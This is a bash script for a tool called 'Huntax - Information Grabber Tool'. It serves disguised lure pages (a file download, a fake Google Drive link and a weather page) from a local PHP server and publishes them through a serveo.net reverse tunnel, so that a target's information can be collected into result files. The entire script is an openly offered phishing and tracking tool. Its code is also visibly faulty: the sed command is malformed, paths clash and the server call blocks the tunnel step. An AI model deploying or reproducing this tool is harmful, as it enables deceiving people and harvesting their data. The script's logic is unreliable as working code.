Red='\033[0;31m'          # Red
Green='\033[0;32m'        # Green
Yellow='\033[0;33m'       # Yellow
White='\033[0;37m'        # White

echo -e "  ${Yellow}_    _             _             "
echo " | |  | |           | |            "
echo " | |__| |_   _ _ __ | |_ __ ___  __"
echo -e "${White} |  __  | | | | '_ \| __/ _- \ \/ /"
echo " | |  | | |_| | | | | || (_| |>  < "
echo -e " ${Green}|_|  |_|\__,_|_| |_|\__\__,_/_/\_|"

sleep 3
echo "."
echo "."
echo "."
echo "."
echo -e "[+] ${Yellow}Huntax - Information Grabber Tool"
echo -e "[+] ${Red}Use it carefully, at your own risk"
sleep 2
echo "."
echo "."
echo "."
echo "."

echo -e "${White}Choose the Template:"
echo
echo -e "${Yellow}[+] 1. File Download"
echo "[+] 2. Google Drive"
echo "[+] 3. Weather Page"
echo "."
echo "."
echo "."
echo "."

read -p ">> Enter Template Number: " tempno

echo "."
echo "."
echo "."
echo "."

filedownload(){

    echo "Starting PHP Server..."
    cd /Tracker/filedownload
    php -S 127.0.0.1:8000
    echo "Starting serveo"
    ssh -R filedownloadersitex:80:127.0.0.1:8000 serveo.net
    echo "[+] Direct link: filedownloadersitex.serveo.net"
}

gdrive(){

    read -p ">> Enter Google Drive File URL: " gdriveurl  #receiving replaceable drive url
    cd Tracker/gdrive
    sed -i "s/REDIRECT_URL/$gdriveurl" temploc.js
    echo "Success, Google Drive url injected.."
    echo "."
    echo "."
    echo "Starting PHP Server..."
    cd ../Tracker/gdrive
    php -S 127.0.0.1:8000
    echo "Starting serveo"
    ssh -R googledrivedownloaderx:80:127.0.0.1:8000 serveo.net
    echo "[+] Direct link: googledrivedownloaderx.serveo.net"
    
}

weather(){

    echo "Starting PHP Server..."
    cd /Tracker/weather
    php -S 127.0.0.1:8000
    echo "Starting serveo"
    ssh -R weatherfindersitex:80:127.0.0.1:8000 serveo.net
    echo "[+] Direct link: weatherfindersitex.serveo.net"
}


resultopen(){
    echo "Sucessfully received Info of Target.."
    echo "Fetching information of Target..."
    echo /Tracker/filedownload/php/result.txt
    echo /Tracker/gdrive/php/result.txt
    echo /Tracker/weather/php/result.txt
}

if [ $tempno == 1 ]
then
    echo "Executing File Downloader Template"
    filedownload
    sleep 2m        #sleeping for 2 minutes
    resultopen      # Open results page after 2 mins

elif [ $tempno == 2 ]
then 
    echo "Executing Google Drive Template"
    gdrive
    sleep 2m
    resultopen

elif [ $tempno == 3 ]
then
    echo "Executing Weather Template"
    weather
    sleep 2m
    resultopen
else
    echo -e "${Red}Please choose a proper Template!"
fi